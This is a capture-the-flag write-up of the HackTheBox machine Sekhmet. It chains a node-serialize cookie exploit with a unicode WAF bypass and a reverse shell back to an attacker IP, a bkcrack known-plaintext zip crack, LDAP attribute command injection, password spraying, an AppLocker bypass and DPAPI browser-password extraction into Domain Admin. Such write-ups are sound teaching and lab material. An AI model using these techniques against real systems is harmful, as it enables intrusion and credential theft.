---
layout: post
title: "The Lioness Keeps Her Cache"
subtitle: "HTB Sekhmet, where a cookie deserializes into a shell, a zip bleeds an AD hash to a known-plaintext attack, and a phone number becomes a command on the way to Domain Admin"
date: 2023-04-08 12:00:00 +0000
description: "An Express cookie that runs your code, a backup zip cracked by what was already inside it, and a phone field that turns into a shell, all stacked into one of the longest roads to Domain Admin the platform ever paved."
image: /assets/og/the-lioness-keeps-her-cache.png
tags: [hackthebox, writeup]
---

Sekhmet is named for a war goddess with the head of a lioness, and the box fights like one. It does not have a vulnerability so much as a campaign. You start at a cookie that the server deserializes into running code, claw your way past a firewall that thinks it has seen every trick, and land in a Linux virtual machine bolted on top of a Windows host. Inside that VM sits a backup zip you cannot open, until you realize the thing that unlocks it was packed inside it the whole time. From there a directory hash, a Kerberos ticket, a phone number rewritten into a command, a captured password sprayed across a domain, and finally a browser quietly holding the keys to the kingdom. Every single step is a person trusting input they should have searched at the door. The box is long, but it is honest. It never once cheats you. It just refuses to let go.

```
        S E K H M E T
        =============
        cookie  →  the server reads your name aloud
                   and the name is a command
                        |
        a zip you can't open, holding the key
        to open itself  (the plaintext was inside)
                        |
        a phone number rewritten:  $(do this)
        a hash sniffed off the wire, sprayed,
        and a browser still whispering a password
                        |
                        v
        the lioness kept her cache. you took it.
                                            獅
```

## 0x01 · the portal

Two ports answer, and they are quiet to the point of rudeness. SSH and nginx, nothing else.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian-5 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
```

The web root is nothing, but a virtual-host fuzz with `ffuf` against the `windcorp.htb` domain shakes loose a subdomain, `portal.windcorp.htb`, running an Express application. Express means Node, and Node means the moment you see a session cookie that looks like serialized data, your pulse should pick up. The cookie is not a token the server merely compares. It is an object the server rebuilds. Rebuilding an attacker's object is where this whole box begins.

## 0x02 · the cookie that ran

The app deserializes the session cookie with the old `node-serialize` library, and that library has a flaw that has gotten people killed for years. It will happily revive a function and then call it. The marker `_$$ND_FUNC$$_` tells the deserializer "what follows is a function," and a self-invoking function runs at the instant the object comes back to life. Picture handing a butler a sealed envelope labeled "guest list." He is supposed to read the names and check them. Instead, this butler unfolds the paper, sees it is shaped like an instruction, and carries it out before he has read a single name. Your cookie says `child_process.exec(...)`, and the server obeys.

There is a guard in the hallway, though. ModSecurity sits in front with the OWASP Core Rule Set, and it knows what a `node-serialize` payload smells like. It blocks `function(){`, it blocks the `$$` marker, it blocks the obvious shapes. The bypass is to spell the dangerous characters in a costume the WAF does not recognize but the JavaScript engine does. Swap `$` for its unicode escape `$` and `{` for `{`. The firewall reads inert-looking text and waves it through. Node reads the same bytes, decodes the escapes, and sees the exact forbidden function. Think of it like smuggling a word past a censor who only bans the English spelling, by writing it in a different alphabet that the reader downstream silently translates back.

```
# the cookie payload, unicode-laundered past the WAF
{"rce":"_$$ND_FUNC$$_function(){ [ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ] }()"}
   ($ → $, { → { so ModSecurity sees nothing it knows)
```

Base64 that into the session cookie, fire one request, and a shell drops as `webster` on a Linux box. Except `uname` and the network tell a stranger story. This is a virtual machine living inside the real Windows target. You have not landed on Sekhmet. You have landed on a tenant renting a room in it.

## 0x03 · the zip that held its own key

In a home directory sits `backup.zip`, encrypted with the legacy ZipCrypto scheme. You do not have the password. What you do have is a listing of what is inside, and one of the files is a copy of `/etc/passwd`, a file you can read on the running system right now.

That is the entire game. ZipCrypto's cipher is so weak that if you know the plaintext of even one file in the archive, you can recover the internal keystream and decrypt everything else. The tool is `bkcrack`, and the attack is called known-plaintext. Think of it like a diary written in a substitution cipher, where the diarist was careless enough to also tape in a printed page you already own. Line your known page up against its encrypted twin, and the substitution rules fall out letter by letter. Now you can read every other page.

```
# zip the known plaintext, then let bkcrack line it up against the encrypted copy
$ zip plain.zip etc/passwd
$ bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd
[+] Keys: 12345678 9abcdef0 ...
# rewrite the archive under a password we choose
$ bkcrack -C backup.zip -k 12345678 9abcdef0 ... -U cracked.zip iceberg
```

Inside the cracked archive is the SSSD cache, the local database where a Linux box logged into Active Directory stores credentials so users can log in when the domain controller is unreachable. That cache holds `ray.duncan`'s hashed password. Feed it to `hashcat` in SHA512crypt mode and it falls to `pantera`.

## 0x04 · ksu and the trust

`ray.duncan` is a domain user, and this VM trusts the domain for authentication. So you request a Kerberos ticket as Ray, and then you ask the system to escalate.

```
$ kinit ray.duncan          # password: pantera
$ ksu                        # like sudo, but it asks Kerberos who you are
root@webserver:/#
```

`ksu` is the Kerberos cousin of `sudo`. Where `sudo` checks a local file, `ksu` checks whether your Kerberos identity is allowed to become root, and Ray is on that list. No exploit, no overflow. The box simply asked the domain "is this person allowed," the domain said yes, and you were holding the ticket that proved you were that person. Root on the VM, and now you turn to face the actual machine underneath.

## 0x05 · the phone number that was a command

A scheduled script on the Windows host reaches into the directory and reads the `mobile` attribute, the phone number field, for a handful of users, then writes those values into a file. It does this by pasting the attribute straight into a shell. You have already seen this disease twice on this box. A field meant to hold inert text gets handed to the machinery as an instruction.

You can write to Ray's `mobile` attribute. So you write a command into it.

```
# set a phone number that is actually a shell command
$ ldapmodify ... <<EOF
dn: CN=Ray Duncan,...
replace: mobile
mobile: $(command runs as scriptrunner)
EOF
```

When the task next runs, it reads the "phone number" and executes it as the `scriptrunner` service account. Picture a mail-merge that prints address labels by literally typing each address into a command line. Most addresses print fine. The one that reads `$(burn the mailroom)` does not get printed, it gets run. You aim that command at a share on your own tunnel, the script's account reaches out to authenticate, and you catch its NetNTLMv2 hash on the wire with an SMB listener. `hashcat` in mode 5600 cracks it to `scriptrunner`'s password.

One credential is rarely just one credential. Spray that password across the whole user list with `kerbrute`, and `bob.wood` is reusing it. Bob has a Kerberos ticket, Bob has WinRM, and so for the first time you log into the Windows host as a real domain user.

```
$ proxychains kinit bob.wood
$ proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb
*Evil-WinRM* PS C:\Users\bob.wood\Documents> type ..\Desktop\user.txt
████████████████████████████████
```

## 0x06 · the cage and the writable corner

Bob lands in a cage. Constrained Language Mode strips PowerShell down to a toy, and AppLocker forbids running binaries from anywhere a normal user can write. Most of your toolkit is dead on arrival. CLM blocks the language features that real tooling needs, and AppLocker blocks the executables, so you are boxed in twice.

AppLocker is only as good as its list of forbidden paths, and someone left a gap. The directory `C:\windows\debug\wia` lives under a system folder, which feels safe, but it is writable by ordinary users and it was never added to the deny rules. Think of it like a museum that bans bags from every gallery but forgot to put a guard on the loading dock, which connects to every gallery. Drop your tools there and they run.

```
*Evil-WinRM* PS> copy C:\Windows\System32\cmd.exe C:\windows\debug\wia\iceberg.exe
*Evil-WinRM* PS> C:\windows\debug\wia\iceberg.exe   # runs, AppLocker none the wiser
```

## 0x07 · the browser that kept a secret

Bob runs Microsoft Edge, and Edge remembers passwords. One of them is for `bob.woodADM`, an administrative twin of his own account. The passwords are sealed with DPAPI, the Windows scheme that encrypts a user's secrets with a key derived from that user's login password. You are Bob, and you know Bob's password, so the seal is yours to break.

Pull the encrypted `Login Data` database and the `Local State` file off the host. Then `pypykatz` walks the DPAPI chain. It uses Bob's password and SID to derive the prekey, the prekey unlocks the master key, and the master key unlocks the saved password. Think of it like a safe-deposit box where the bank's master key is itself locked in a smaller box, and that smaller box opens with something you already carry. Pull the thread and every knot comes loose in order.

```
$ pypykatz dpapi masterkey ... -o masterkey.bin   # bob's password + SID derive it
$ pypykatz dpapi chrome --logindata logindata masterkey.bin localstate
   bob.woodADM@windcorp.com : smeT-Worg-wer-m024
```

That ADM account is in Domain Admins. Log in as `bob.woodADM`, confirm the membership, and the campaign is finally over.

```
*Evil-WinRM* PS> whoami /groups | findstr "Domain Admins"
WINDCORP\Domain Admins
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x08 · the honest caveat

Sekhmet looks like nine unrelated tricks, but it is one mistake retold in nine dialects. A cookie, a phone number, and a scheduled script all died the same death, the death where a field meant to carry data gets read as a command. That is injection, and it does not care whether the envelope is JSON, an LDAP attribute, or a filename. The lesson the box keeps screaming is that the boundary between "things people typed" and "things the machine does" has to be drawn in concrete, and most breaches are a place where someone drew it in chalk.

The two steps that should actually keep a defender awake are the quiet ones. The zip fell not to a brute force but to a file that was sitting inside it, which means the encryption was sound and the packing was the crime. You can rotate every password on the network and that backup stays openable forever, because the weakness is the archive format, not a secret. And the browser is worse, because nothing there was broken at all. Edge stored a Domain Admin password exactly the way it was designed to, sealed to a user who could unseal it, and the whole privilege jump was just Windows doing its job for the person standing in Bob's shoes. You cannot patch your way out of a credential that was never supposed to be sitting in a browser. You have to make sure it was never there.

## 0x09 · outro

```
the cookie was read as a command. the zip carried its own key.
the phone number dialed a shell. the browser kept a god's password.

nine doors, and not one of them was forced.
every lock had the key taped to the back, by a hand that meant well.

search the input. trust no envelope. wear black.

                                                            EOF
```

---

*HTB: Sekhmet, retired 01 Apr 2023. An insane Windows box that is really one injection lesson wearing nine costumes, with a known-plaintext zip and a DPAPI browser stash for the long road to Domain Admin. The lioness still guards her cache in a lab and nowhere you don't own.*